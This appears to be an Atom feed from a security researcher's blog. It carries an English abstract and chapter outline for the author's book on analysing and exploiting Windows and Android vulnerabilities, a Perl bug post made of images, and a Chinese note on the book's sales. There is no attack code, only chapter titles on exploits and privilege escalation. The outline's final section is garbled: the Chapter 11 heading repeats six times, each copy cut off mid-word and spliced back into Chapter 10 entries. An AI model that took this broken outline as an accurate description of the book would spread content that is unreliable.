<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>riusksk&#39;s blog</title>
  <subtitle>攀蟾折桂摄寰宇，摘星揽月御乾坤。踏云踩雾骋宵壤，驱风逐日闯天地。 ------泉哥</subtitle>
  <link href="//atom.xml" rel="self"/>
  
  <link href="http://riusksk.github.io/"/>
  <updated>2016-09-13T07:42:33.000Z</updated>
  <id>http://riusksk.github.io/</id>
  
  <author>
    <name>riusksk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnerability War: The Essence of Software Vulnerabilities Analysis</title>
    <link href="http://riusksk.github.io/2016/09/13/Vulnerability-War-The-Essence-of-Software-Vulnerabilities-Analysis/"/>
    <id>http://riusksk.github.io/2016/09/13/Vulnerability-War-The-Essence-of-Software-Vulnerabilities-Analysis/</id>
    <published>2016-09-13T07:18:21.000Z</published>
    <updated>2016-09-13T07:42:33.000Z</updated>
    
    <content type="html">&lt;p&gt;By riusksk(@riusksk)&lt;br&gt;&lt;img src=&quot;http://riusksk.me/media/vul_war_eng.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Content-Abstract&quot;&gt;&lt;a href=&quot;#Content-Abstract&quot; class=&quot;headerlink&quot; title=&quot;Content Abstract&quot;&gt;&lt;/a&gt;Content Abstract&lt;/h2&gt;&lt;p&gt;Vulnerability War: The Essence of Software Vulnerabilities Analysis systematically explain all kinds of tools, techniques and practical methods in software vulnerability analysis and exploit, mainly related to Windows and Android platform. The book is classfied according to the different vulnerabilities, such as stack overflow, sandbox escape, types confusion, UAF , kernel vulnerability etc., at the same time, in view of the current popular mobile security, add Android platform vulnerability analysis and exploit into it. The author carefully chosen classic Vulnerabilities to share analysis techniques and tools about the cause of these vulnerabilities analysis, exploit and fix methods in detail. The biggest characteristic of this book is the actual combat based on the various types of classical vulnerabilities and discard useless theory, it’s almost “a book written out by debugger”.&lt;/p&gt;
&lt;p&gt;This book is suitable for students of computer science related, somebody worked in information security, software security and mobile security related areas, software developer and hackers to read.&lt;/p&gt;
&lt;h2 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; class=&quot;headerlink&quot; title=&quot;Table of Contents&quot;&gt;&lt;/a&gt;Table of Contents&lt;/h2&gt;&lt;h3 id=&quot;Chapter-1-Basic-Knowledge&quot;&gt;&lt;a href=&quot;#Chapter-1-Basic-Knowledge&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1: Basic Knowledge&quot;&gt;&lt;/a&gt;Chapter 1: Basic Knowledge&lt;/h3&gt;&lt;p&gt;1.1 The Concepts of Vulnerability&lt;br&gt;1.1.1 What is The Vulnerability&lt;br&gt;1.1.2 The Value of Vulnerabilities&lt;br&gt;1.1.3 0day Vulnerability&lt;br&gt;1.1.4 PoC and Exploit&lt;br&gt;1.2 Why to analysis vunerabilities&lt;br&gt;1.3 The commonly analysis tools&lt;br&gt;1.3.1 IDA: the disassembly tool&lt;br&gt;1.3.2 OllyDbg: the crack and reverse analysis tool&lt;br&gt;1.3.3 Immunity Debugger: vulnerability analysis debugger&lt;br&gt;1.3.4 Windbg: Microsoft Windows Debugger&lt;br&gt;1.3.5 GDB: Linux Debugger&lt;br&gt;1.3.6 JEB: Android Decompilater&lt;br&gt;1.3.7 Other&lt;br&gt;1.4 The common vulnerability analysis method&lt;br&gt;1.4.1 Static analysis&lt;br&gt;1.4.2 Dynamic debugging&lt;br&gt;1.4.3 Source code analysis&lt;br&gt;1.4.4 Patch compare&lt;br&gt;1.4.5 Taint track&lt;br&gt;1.5 Learning resources&lt;br&gt;1.5.1 Some security sites&lt;br&gt;1.5.2 Recommended books&lt;br&gt;1.6 Summary&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Chapter-2-Stack-Overflow-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-2-Stack-Overflow-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 2: Stack Overflow Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 2: Stack Overflow Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;2.1 A brief history of stack overflow&lt;br&gt;2.2 The principle of stack overflow&lt;br&gt;2.3 CVE-2010-2883 Adobe Reader TTF Font SING Table Stack Overflow&lt;br&gt;2.3.1 LuckyCat APT Attacks&lt;br&gt;2.3.2 Vulnerability Description&lt;br&gt;2.3.3 Analysis environment&lt;br&gt;2.3.4 The Vulnerability Analysis Method Based On String Search&lt;br&gt;2.3.5 Exploit Technical Analysis of Sample&lt;br&gt;2.3.6 Shellcode Malicious Behavior Analysis of Sample&lt;br&gt;2.3.7 Vulnerability Fixes&lt;br&gt;2.4 CVE-2010-3333 Microsoft RTF File Stack Overflow&lt;br&gt;2.4.1 Linsanity Attack Event&lt;br&gt;2.4.2 Vulnerability Description&lt;br&gt;2.4.3 Analysis Environment&lt;br&gt;2.4.4 RTF File Format&lt;br&gt;2.4.5 The Vulnerability Analysis Method Based On Stack Backtrace&lt;br&gt;2.4.6 Vulnerability Exploit&lt;br&gt;2.4.7 Office 2003 and Office 2007 Commonality Exploit Technical Research&lt;br&gt;2.4.8 Vulnerability Fixes&lt;br&gt;2.5 CVE-2011-0104 Microsoft Excel TOOLBARDEF Record Stack Overflow&lt;br&gt;2.5.1 Vulnerability Description&lt;br&gt;2.5.2 Analysis Environment&lt;br&gt;2.5.3 The Vulnerability Analysis Method Based On Taint Track&lt;br&gt;2.5.4 Vulnerability Fixes&lt;br&gt;2.6 AliWangWang ActiveX Control imageMan.dll Stack Overflow&lt;br&gt;2.6.1 Vulnerability Description&lt;br&gt;2.6.2 Analysis Environment&lt;br&gt;2.6.3 ActiveX Control Vulnerability Analysis Method&lt;br&gt;2.6.4 Vulnerability Exploit&lt;br&gt;2.7 CVE-2012-0158 Microsoft Office MSCOMCTL.ocx Stack Overflow&lt;br&gt;2.7.1 Lotus Blossom Operation&lt;br&gt;2.7.2 Vulnerability Description&lt;br&gt;2.7.3 Analysis Environment&lt;br&gt;2.7.4 Office Vulnerability Analysis With OffVis&lt;br&gt;2.7.4 Vulnerability Fixes&lt;br&gt;2.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-3-Heap-Overflow-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-3-Heap-Overflow-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 3: Heap Overflow Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 3: Heap Overflow Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;3.1 A Brief History of Heap Overflow&lt;br&gt;3.2 The Principle of Heap Overflow&lt;br&gt;3.3 Heap Debugging Skills&lt;br&gt;3.3.1 Heap Tail Check&lt;br&gt;3.3.2 Page Heap&lt;br&gt;3.4 CVE-2010-2553 Microsoft Cinepak Codec CVDecompress Heap Overflow&lt;br&gt;3.4.1 Vulnerability Description&lt;br&gt;3.4.2 Analysis Environment&lt;br&gt;3.4.3 Heap Vulnerability Analysis Method Based On HeapPage&lt;br&gt;3.4.4 Vulnerability Fixes&lt;br&gt;3.5 CVE-2012-0003 Microsoft Windows Media Player winmmdll MIDI File Heap Overflow&lt;br&gt;3.5.1 About Zhi-Zhu Exploit Pack&lt;br&gt;3.5.2 Vulnerability Description&lt;br&gt;3.5.3 Analysis Environment&lt;br&gt;3.5.4 MIDI File Format&lt;br&gt;3.5.5 Vulnerability Analysis Method Based On Mapping Calculated&lt;br&gt;3.5.6 Vulnerability Exploit&lt;br&gt;3.5.7 Patch Different&lt;br&gt;3.6 CVE-2013-0077 Microsoft DirectShow quartz.dll M2P File Heap Overflow&lt;br&gt;3.6.1 Vulnerability Description&lt;br&gt;3.6.2 Vulnerability Analysis With HTC&lt;br&gt;3.6.3 Vulnerability Fixes&lt;br&gt;3.7 CVE-2012-1876 Internet Exporter MSHTMLdll CalculateMinMax Heap Overflow&lt;br&gt;3.7.1 The Vulnerability Used to Break IE9 Browser in Pwn2Own Hacking Contest&lt;br&gt;3.7.2 Analysis Environment&lt;br&gt;3.7.3 Vulnerability Analysis With HPA&lt;br&gt;3.7.4 Vulnerability Exploit Based On Infomation Leakage&lt;br&gt;3.7.5 Vulnerability Fixes&lt;br&gt;3.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-4-Integer-Overflow-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-4-Integer-Overflow-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 4: Integer Overflow Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 4: Integer Overflow Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;4.1 A Brief History of Integer Overflow&lt;br&gt;4.2 The Principle of Integer Overflow&lt;br&gt;4.2.1 Integer Overflow In Stack&lt;br&gt;4.2.2 Integer Overflow In Heap&lt;br&gt;4.3 CVE-2011-0027 Microsoft Data Access Components Integer Overflow&lt;br&gt;4.3.1 The Vulnerability Used to Break IE8 Browser in Pwn2Own Hacking Contest&lt;br&gt;4.3.2 Vulnerability Analysis Method Based On Heap Allocation Record&lt;br&gt;4.3.3 Patch Different&lt;br&gt;4.4 CVE-2012-0774 Adobe Reader TrueType Font Integer Overflow&lt;br&gt;4.4.1 Vulnerability Description&lt;br&gt;4.4.2 PDF File Format and Commonly Analysis Tools&lt;br&gt;4.4.3 Vulnerability Analysis Method Based On Condition Records Breakpoint&lt;br&gt;4.4.4 Patch Analysis&lt;br&gt;4.5 CVE-2013-0750 Firefox String Replace Integer Overflow&lt;br&gt;4.5.1 Vulnerability Description&lt;br&gt;4.5.2 Vulnerability Analysis Method Based On Source Code Debugging&lt;br&gt;4.5.3 Source Code Diff&lt;br&gt;4.6 CVE-2013-2551 Internet Explorer VML COALineDashStyleArray Integer Overflow&lt;br&gt;4.6.1 The Vulnerability Used to Break IE10 Browser in Pwn2Own Hacking Contest&lt;br&gt;4.6.2 Vulnerability Analysis Method Based On Class Function Search&lt;br&gt;4.6.3 Used Info Leak to Exploit&lt;br&gt;4.7 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-5-Format-String-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-5-Format-String-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 5: Format String Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 5: Format String Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;5.1 A Brief History of Format String Vulnerability&lt;br&gt;5.2 The Principle of Format String Vulnerability&lt;br&gt;5.3 CVE-2012-0809 Sudo sudo_debug Format String Vulnerability&lt;br&gt;5.3.1 Vulnerability Description&lt;br&gt;5.3.2 Analysis Vulnerability By Source Code Diff&lt;br&gt;5.4 CVE-2012-3569 VMware OVF Tool Format String Vulnerability&lt;br&gt;5.4.1 Vulnerability Description&lt;br&gt;5.4.2 Vulnerability Analysis Method Based On Output Message&lt;br&gt;5.4.3 Vulnerability Exploit&lt;br&gt;5.5 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-6-Double-Free-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-6-Double-Free-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 6: Double Free Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 6: Double Free Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;6.1 A Brief History of Double Free Vulnerability&lt;br&gt;6.2 The Principle of Double Free Vulnerability&lt;br&gt;6.3 CVE-2010-3974 Windows Fax Cover Editor fxscover.exe Double Free&lt;br&gt;6.3.1 Vulnerability Description&lt;br&gt;6.3.2 Used Stack Backtrack and Heap State to Detect Vulnerability Type&lt;br&gt;6.3.3 Used Patch Diff to Analysis Vulnerability Causes and Fix Method&lt;br&gt;6.4 CVE-2014-0502 Adobe Flash Player Double Free&lt;br&gt;6.4.1 GreedyWonk Operation&lt;br&gt;6.4.2 Static Analysis Attack Sample&lt;br&gt;6.4.3 Automation Simulation Shellcode Execution&lt;br&gt;6.4.4 Trace Back Analysis Based on ROP Instruction Address&lt;br&gt;6.5 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-7-Use-After-Free-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-7-Use-After-Free-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 7: Use After Free Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 7: Use After Free Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;7.1 A Brief History of Use After Free(UAF)&lt;br&gt;7.2 The Principle of UAF&lt;br&gt;7.3 CVE-2011-0065 Firefox mChannel UAF Vulnerability&lt;br&gt;7.3.1 Vulnerability Description&lt;br&gt;7.3.2 Through Dynamic debugging to Rapid Positioning Source Code Which Lead to Bug&lt;br&gt;7.3.3 Vulnerability Exploit&lt;br&gt;7.3.4 Source Code Compare&lt;br&gt;7.4 CVE-2013-1347 Microsoft IE CGenericElement Use After Free&lt;br&gt;7.4.1 Watering Hole Attack Event&lt;br&gt;7.4.2 Rapid Positioning Vulnerability Object With HPA&lt;br&gt;7.4.3 Reverse Analysis IE JavaScript Engine&lt;br&gt;7.4.4 Analysis The Cause of Vulnerability&lt;br&gt;7.4.5 Vulnerability Exploit&lt;br&gt;7.5 CVE-2013-3346 Adobe Reader ToolButton UAF Vulnerability&lt;br&gt;7.5.1 “Epic Turla” Cyber Espionage Attacks&lt;br&gt;7.5.2 Analysis Malicious PDF Sample With peepdf&lt;br&gt;7.5.3 Vulnerability Exploit&lt;br&gt;7.6 CVE-2015-0313 Adobe Flash Player Workers ByteArray UAF Vulnerability&lt;br&gt;7.6.1 Vulnerability Description&lt;br&gt;7.6.2 Analysis ActiveScript VM Source Code to Help Vulnerability Debugging&lt;br&gt;7.6.3 Flash JIT Debugging Plugin and Symbol File&lt;br&gt;7.6.4 Vulnerability Exploit&lt;br&gt;7.6.5 Vulnerability Fixes&lt;br&gt;7.7 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-8-Array-Out-of-Bound-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-8-Array-Out-of-Bound-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 8: Array Out-of-Bound Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 8: Array Out-of-Bound Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;8.1 The Relationship Between Array Out-of-Bound and Overflow&lt;br&gt;8.2 The Principle of Array Out-of-Bound Vulnerability&lt;br&gt;8.3 CVE-2011-2110 Adobe Flash Player Array Out-of-Bound Access Vulnerability&lt;br&gt;8.3.1 Vulnerability Description&lt;br&gt;8.3.2 Solve The Problem of Restriction to Install The Old Version Flash Player&lt;br&gt;8.3.3 Use Perl Script to Analysis Sample&lt;br&gt;8.3.4 Setup The Server to Reproduce Bug&lt;br&gt;8.3.5 Modify Sample Code to Analysis Vulnerability&lt;br&gt;8.3.6 Constructing Info Leak to Exploit&lt;br&gt;8.3.7 Search Instruction Sequence to Analysis Patch&lt;br&gt;8.4 CVE-2014-0160 OpenSSL TLS Array Out-of-Bound Vulnerability(“Heart Bleeding”)&lt;br&gt;8.4.1 Vulnerability Description&lt;br&gt;8.4.2 Vulnerability Analysis Method Based On Source Code Contrast and Tracking&lt;br&gt;8.4.3 Exploit Vulnerability to Steal Site Account&lt;br&gt;8.5 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-9-Kernel-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-9-Kernel-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 9: Kernel Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 9: Kernel Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;9.1 Talk About Windows Kernel Vulnerability&lt;br&gt;9.2 Build Windows Kernel Debugging Environment&lt;br&gt;9.3 Common Kernel Vulnerability Principle And Exploit&lt;br&gt;9.3.1 Vulnerability Cause Analysis&lt;br&gt;9.3.2 vulnerability Exploit&lt;br&gt;9.4 360 Security Guards bregdrv.sys Local Privilege Escalation Analysis&lt;br&gt;9.4.1 Vulnerability Description&lt;br&gt;9.4.2 Tracking Analysis With Export Function and IO Control Code&lt;br&gt;9.5 CVE-2011-2005 Windows Afd.sys Local Privilege Escalation&lt;br&gt;9.5.1 Vulnerability Description&lt;br&gt;9.5.2 From Exploit Code to Vulnerability Function Positioning Analysis&lt;br&gt;9.5.3 Patch Different&lt;br&gt;9.6 CVE-2013-3660 Windows win32ksys EPATHOB Pointer Uninitialized Vulnerability&lt;br&gt;9.6.1 Vulnerability Description&lt;br&gt;9.6.2 Auxiliary Analysis With IDA Defined Structure&lt;br&gt;9.6.3 Vulnerability Exploit&lt;br&gt;9.7 CVE-2014-1767 Windows AFD.sys Double Free Vulnerability(Pwn2Own 2014)&lt;br&gt;9.7.1 The Best Privilege Escalation Bug in Pwnie Awards 2014&lt;br&gt;9.7.2 Vulnerability Analysis Method Based on IOCTL Handler Automatically Track Record&lt;br&gt;9.7.3 Vulnerability Exploit&lt;br&gt;9.7.4 Patch Analysis&lt;br&gt;9.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-10-Android-Platform-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-10-Android-Platform-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 10: Android Platform Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 10: Android Platform Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;10.1 A Brief History of Android Platform Vulnerability&lt;br&gt;10.2 Android Platform Vulnerability Type&lt;br&gt;10.3 The Common Vulnerability Analysis Methods&lt;br&gt;10.3.1 APK Static Analysis&lt;br&gt;10.3.2 Smali Dynamic Debugging&lt;br&gt;10.3.3 so Library Dynamic Debugging&lt;br&gt;10.3.4 Patch Source Code Different&lt;br&gt;10.3.5 System Java Source Code Debugging&lt;br&gt;10.3.6 System C/C++ Source Code Debugging&lt;br&gt;10.3.7 Android Kernel Source Code Debugging&lt;br&gt;10.4  Smart Outlet Vulnerability Analysis&lt;br&gt;10.4.1 Vulnerability Description&lt;br&gt;10.4.2 Static Reverse Analysis&lt;br&gt;10.4.3 Exploit Vulnerability to Control Arbitrary Outlet in Network&lt;br&gt;10.4.4 Summary&lt;br&gt;10.5 CVE-2013-4787 Android Signature Vulnerability&lt;br&gt;10.5.1 Vulnerability Description&lt;br&gt;10.5.2 Android Signature Mechanism&lt;br&gt;10.5.3 Reproduce Bug&lt;br&gt;10.5.4 Vulnerability Analysis&lt;br&gt;10.5.5 Vulnerability Fixes&lt;br&gt;10.6 CVE-2010-1119 Android WebKit UAF Vulnerability&lt;br&gt;10.6.1 Vulnerability Description&lt;br&gt;10.6.2 Vulnerability Exploit&lt;br&gt;10.6.3 Analysis Patch Source Code to Positioning Cause&lt;br&gt;10.7 CVE-2014-3153 Android Kernel Futex Privilege Escalation (Towelroot)&lt;br&gt;10.7.1 Android Devices Root Tool —— Towelroot&lt;br&gt;10.7.2 Analysis Vulnerability With Kernel Source Code Debugging&lt;br&gt;10.7.3 Vulnerability Exploit&lt;br&gt;10.7.4 Vulnerability Fixes&lt;br&gt;10.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-11-Other-Types-of-Vulnerability-Analysis&quot;&gt;&lt;a href=&quot;#Chapter-11-Other-Types-of-Vulnerability-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Chapter 11: Other Types of Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 11: Other Types of Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;11.1 Introduction&lt;br&gt;11.2 CVE-2013-2423 JAVA Applet Reflection Type Confusion Code Execut7.3 Vulnerability Exploit&lt;br&gt;10.7.4 Vulnerability Fixes&lt;br&gt;10.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-11-Other-Types-of-Vulnerability-Analysis-1&quot;&gt;&lt;a href=&quot;#Chapter-11-Other-Types-of-Vulnerability-Analysis-1&quot; class=&quot;headerlink&quot; title=&quot;Chapter 11: Other Types of Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 11: Other Types of Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;11.1 Introduction&lt;br&gt;11.2 CVE-2013-2423 JAVA Applet Reflection Type Confusion Code Execut7.3 Vulnerability Exploit&lt;br&gt;10.7.4 Vulnerability Fixes&lt;br&gt;10.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-11-Other-Types-of-Vulnerability-Analysis-2&quot;&gt;&lt;a href=&quot;#Chapter-11-Other-Types-of-Vulnerability-Analysis-2&quot; class=&quot;headerlink&quot; title=&quot;Chapter 11: Other Types of Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 11: Other Types of Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;11.1 Introduction&lt;br&gt;11.2 CVE-2013-2423 JAVA Applet Reflection Type Confusion Code Execut7.3 Vulnerability Exploit&lt;br&gt;10.7.4 Vulnerability Fixes&lt;br&gt;10.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-11-Other-Types-of-Vulnerability-Analysis-3&quot;&gt;&lt;a href=&quot;#Chapter-11-Other-Types-of-Vulnerability-Analysis-3&quot; class=&quot;headerlink&quot; title=&quot;Chapter 11: Other Types of Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 11: Other Types of Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;11.1 Introduction&lt;br&gt;11.2 CVE-2013-2423 JAVA Applet Reflection Type Confusion Code Execut7.3 Vulnerability Exploit&lt;br&gt;10.7.4 Vulnerability Fixes&lt;br&gt;10.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-11-Other-Types-of-Vulnerability-Analysis-4&quot;&gt;&lt;a href=&quot;#Chapter-11-Other-Types-of-Vulnerability-Analysis-4&quot; class=&quot;headerlink&quot; title=&quot;Chapter 11: Other Types of Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 11: Other Types of Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;11.1 Introduction&lt;br&gt;11.2 CVE-2013-2423 JAVA Applet Reflection Type Confusion Cod Tility Exploit&lt;br&gt;10.7.4 Vulnerability Fixes&lt;br&gt;10.8 Summary&lt;/p&gt;
&lt;h3 id=&quot;Chapter-11-Other-Types-of-Vulnerability-Analysis-5&quot;&gt;&lt;a href=&quot;#Chapter-11-Other-Types-of-Vulnerability-Analysis-5&quot; class=&quot;headerlink&quot; title=&quot;Chapter 11: Other Types of Vulnerability Analysis&quot;&gt;&lt;/a&gt;Chapter 11: Other Types of Vulnerability Analysis&lt;/h3&gt;&lt;p&gt;11.1 Introduction&lt;br&gt;11.2 CVE-2013-2423 JAVA Applet Reflection Type Confusion Code Execut7.3 Vulnerability Exploit&lt;br&gt;10.7.4 Vulnerability Fixes&lt;br&gt;10.8 Summary&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;By riusksk(@riusksk)&lt;br&gt;&lt;img src=&quot;http://riusksk.me/media/vul_war_eng.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Content-Abstract&quot;&gt;&lt;a href=&quot;#Content-Abstract&quot; class=&quot;headerlink&quot; title=&quot;Content Abstract&quot;&gt;&lt;/a&gt;Content Abstract&lt;/h2&gt;&lt;p&gt;Vulnerability War: The Essence of Software Vulnerabilities Analysis systematically explain all kinds of tools, techniques and practical methods in software vulnerability analysis and exploit, mainly related to Windows and Android platform. The book is classfied according to the different vulnerabilities, such as stack overflow, sandbox escape, types confusion, UAF , kernel vulnerability etc., at the same time, in view of the current popular mobile security, add Android platform vulnerability analysis and exploit into it. The author carefully chosen classic Vulnerabilities to share analysis techniques and tools about the cause of these vulnerabilities analysis, exploit and fix methods in detail. The biggest characteristic of this book is the actual combat based on the various types of classical vulnerabilities and discard useless theory, it’s almost “a book written out by debugger”.&lt;/p&gt;
&lt;p&gt;This book is suitable for students of computer science related, somebody worked in information security, software security and mobile security related areas, software developer and hackers to read.&lt;/p&gt;
&lt;h2 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; class=&quot;headerlink&quot; title=&quot;Table of Contents&quot;&gt;&lt;/a&gt;Table of Contents&lt;/h2&gt;&lt;h3 id=&quot;Chapter-1-Basic-Knowledge&quot;&gt;&lt;a href=&quot;#Chapter-1-Basic-Knowledge&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1: Basic Knowledge&quot;&gt;&lt;/a&gt;Chapter 1: Basic Knowledge&lt;/h3&gt;&lt;p&gt;1.1 The Concepts of Vulnerability&lt;br&gt;1.1.1 What is The Vulnerability&lt;br&gt;1.1.2 The Value of Vulnerabilities&lt;br&gt;1.1.3 0day Vulnerability&lt;br&gt;1.1.4 PoC and Exploit&lt;br&gt;1.2 Why to analysis vunerabilities&lt;br&gt;1.3 The commonly analysis tools&lt;br&gt;1.3.1 IDA: the disassembly tool&lt;br&gt;1.3.2 OllyDbg: the crack and reverse analysis tool&lt;br&gt;1.3.3 Immunity Debugger: vulnerability analysis debugger&lt;br&gt;1.3.4 Windbg: Microsoft Windows Debugger&lt;br&gt;1.3.5 GDB: Linux Debugger&lt;br&gt;1.3.6 JEB: Android Decompilater&lt;br&gt;1.3.7 Other&lt;br&gt;1.4 The common vulnerability analysis method&lt;br&gt;1.4.1 Static analysis&lt;br&gt;1.4.2 Dynamic debugging&lt;br&gt;1.4.3 Source code analysis&lt;br&gt;1.4.4 Patch compare&lt;br&gt;1.4.5 Taint track&lt;br&gt;1.5 Learning resources&lt;br&gt;1.5.1 Some security sites&lt;br&gt;1.5.2 Recommended books&lt;br&gt;1.6 Summary&lt;br&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>Perl Bug 一枚</title>
    <link href="http://riusksk.github.io/2016/09/09/Perl-Bug-%E4%B8%80%E6%9E%9A/"/>
    <id>http://riusksk.github.io/2016/09/09/Perl-Bug-一枚/</id>
    <published>2016-09-09T01:55:19.000Z</published>
    <updated>2016-09-11T02:01:37.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/perl_oob.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;官方回复：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/perl_reply.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/perl_oob.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;官方回复：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/perl_reply.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Perl" scheme="http://riusksk.github.io/tags/Perl/"/>
    
  </entry>
  
  <entry>
    <title>China-Pub计算机类图书畅销榜第一</title>
    <link href="http://riusksk.github.io/2016/07/23/China-Pub%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B1%BB%E5%9B%BE%E4%B9%A6%E7%95%85%E9%94%80%E6%A6%9C%E7%AC%AC%E4%B8%80/"/>
    <id>http://riusksk.github.io/2016/07/23/China-Pub计算机类图书畅销榜第一/</id>
    <published>2016-07-23T05:06:02.000Z</published>
    <updated>2016-07-23T08:58:18.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/book_chinapub.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当初编辑联系我出书时，我就曾提前对其说过这类书籍可能受众有限，而且非入门书籍，可能销量不会太理想。&lt;/p&gt;
&lt;p&gt;同时自己觉得，现在安全入门书籍，无论是web还是二进制，其实都已经足够了，没必要再写。&lt;/p&gt;
&lt;p&gt;若是纯粹地追求销量，而忽略书籍的本质内容，还是太对不起自己，也对不起读者，虽然排行磅前列的几名经常被《XXX从入门到精通》给霸占着。&lt;/p&gt;
&lt;p&gt;所以，出书的初衷就是记录自己学习历程中点点滴滴，也是为了备忘，算是一本写给自己的书籍。&lt;/p&gt;
&lt;p&gt;出版后，内心的梗算是放下了，但还是挺忐忑的，后来一位编辑说，基本每一本书的出版都会被骂，然后我就释怀了。&lt;/p&gt;
&lt;p&gt;目前，新书的销售情况还算可观，已经准备再印了，比我想像中的要好，特别感谢各位业界同行的支持！&lt;/p&gt;
&lt;p&gt;当然也有一些非技术的同学也买了，只因前言中的”情怀“，也感谢这些同学的支持。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/book_chinapub.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当初编辑联系我出书时，我就曾提前对其说过这类书籍可能受众有限，而且非入门书籍，可能销量不会太理想。&lt;/p&gt;
&lt;p&gt;同时自己觉得，现在安全入
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
